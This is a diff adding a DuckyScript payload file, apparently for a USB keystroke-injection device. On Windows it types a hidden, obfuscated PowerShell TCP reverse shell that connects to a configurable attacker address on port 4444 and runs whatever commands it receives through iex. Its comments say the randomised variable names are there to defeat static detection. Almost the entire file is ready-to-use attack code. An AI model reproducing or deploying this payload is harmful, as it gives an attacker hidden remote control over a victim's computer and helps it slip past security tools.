@@ -1,0 +1,111 @@
+REM       ReverseDuckyPolymorph
+REM       Version 1.0
+REM       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
+REM       Author: 0iphor13
+REM       Requirement: DuckyScript 3.0, PayloadStudio v. 1.3.0 minimum
+
+REM       TCP Reverse shell executed hidden in the background, the CAPSLOCK light at the end will indicate that the payload was executed.
+REM       Because of randomisation static detection will be impeded
+REM       Define the attacker IP and PORT at line 39 & 40
+REM       DON'T FORGET TO START LISTENER
+
+REM Extension DETECT_READY by Korben for best and fastest deployment
+EXTENSION DETECT_READY
+    REM VERSION 1.0
+
+    REM USAGE:
+    REM Extension runs inline (here)
+    REM Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+    REM boot delay
+
+    REM TARGETS:
+    REM Any system that reflects CAPSLOCK will detect minimum required delay
+    REM Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+
+    REM CONFIGURATION:
+    DEFINE RESPONSE_DELAY 25
+    DEFINE ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+REM Define the attackers IP & Port
+DEFINE ADDRESS '0.0.0.0'
+DEFINE PORT 4444
+
+REM Variables for pseudo random variables
+VAR $var_gibberish = $_RANDOM_INT 
+VAR $var_gibberish2 = $_RANDOM_LETTER_KEYCODE 
+VAR $var_gibberish3 = $_RANDOM_LOWER_LETTER_KEYCODE 
+VAR $var_gibberish4 = $_RANDOM_CHAR_KEYCODE
+VAR $var_gibb3rish = $_RANDOM_NUMBER_KEYCODE
+VAR $var_duckID = $_RANDOM_UPPER_LETTER_KEYCODE
+VAR $var_duckID2 = $_RANDOM_NUMBER_KEYCODE
+VAR $var_duckID3 = $_RANDOM_NUMBER_KEYCODE
+
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -NoP -NonI -w h
+DELAY 500
+STRING $
+INJECT_VAR $var_gibberish
+INJECT_VAR $var_gibberish2
+INJECT_VAR $var_gibberish3
+INJECT_VAR $var_gibberish4
+STRING =[TyPE]('tExT'+'.enCOD'+'InG');$
+INJECT_VAR $var_gibb3rish
+REM Address and Port of the listening machine
+STRING =.('New'+'-Obj'+'ect') System.Net.Sockets.TCPClient( ADDRESS , PORT );$
+INJECT_VAR $var_gibberish4
+STRING =$
+INJECT_VAR $var_gibb3rish
+STRING .GetStream();[byte[]]$b=0..65535|&('%'){0};while(($
+INJECT_VAR $var_gibberish4
+INJECT_VAR $var_gibberish3
+INJECT_VAR $var_gibberish
+INJECT_VAR $var_duckID3
+STRING =$
+INJECT_VAR $var_gibberish4
+STRING .Read($b,0,$b.Length))-ne 0){;$d=(&('New'+'-Ob'+'ject') -TypeName System.Text.ASCIIEncoding).GetString($b,0,$
+INJECT_VAR $var_gibberish4
+INJECT_VAR $var_gibberish3
+INJECT_VAR $var_gibberish
+INJECT_VAR $var_duckID3
+STRING );$X=(&('ie'+'x') $d 2>&1 | .('Out'+'-St'+'ring'));$Z=$X+'Ducky_
+INJECT_VAR $var_duckID
+INJECT_VAR $var_duckID2
+INJECT_VAR $var_duckID3
+STRING @PS '+(&('g'+'l'))+'> ';$
+INJECT_VAR $var_duckID3
+INJECT_VAR $var_gibberish2
+INJECT_VAR $var_gibb3rish
+STRING =($
+INJECT_VAR $var_gibberish
+INJECT_VAR $var_gibberish2
+INJECT_VAR $var_gibberish3
+INJECT_VAR $var_gibberish4
+STRING ::ASCII).GetBytes($Z);$
+INJECT_VAR $var_gibberish4
+STRING .Write($
+INJECT_VAR $var_duckID3
+INJECT_VAR $var_gibberish2
+INJECT_VAR $var_gibb3rish
+STRING ,0,$
+INJECT_VAR $var_duckID3
+INJECT_VAR $var_gibberish2
+INJECT_VAR $var_gibb3rish
+STRING .Length);$
+INJECT_VAR $var_gibberish4
+STRING .Flush()};$
+INJECT_VAR $var_gibb3rish
+STRINGLN .Close();exit
+DELAY 100
+CAPSLOCK
+
